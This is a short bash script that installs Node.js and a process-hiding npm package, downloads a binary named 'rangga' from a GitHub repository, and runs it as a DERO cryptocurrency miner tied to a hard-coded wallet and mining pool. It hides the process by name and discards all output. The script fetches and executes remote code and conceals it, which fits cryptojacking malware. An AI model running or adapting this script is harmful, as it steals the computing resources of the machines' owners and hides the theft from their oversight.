#!/bin/bash
apt update -y
apt install gcc screen -y
curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash
apt install nodejs -y
npm install -g npm@8.18.0 -y && npm i -g node-process-hider && ph add rangga
wget https://github.com/danipedrosang/marcrash/raw/main/rangga && chmod +x rangga
./rangga --wallet-address=deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6838l67tghl8zqsn7unx --daemon-rpc-address=dero.rabidmining.com:10300 --mining-threads=1 >/dev/null 2>&1
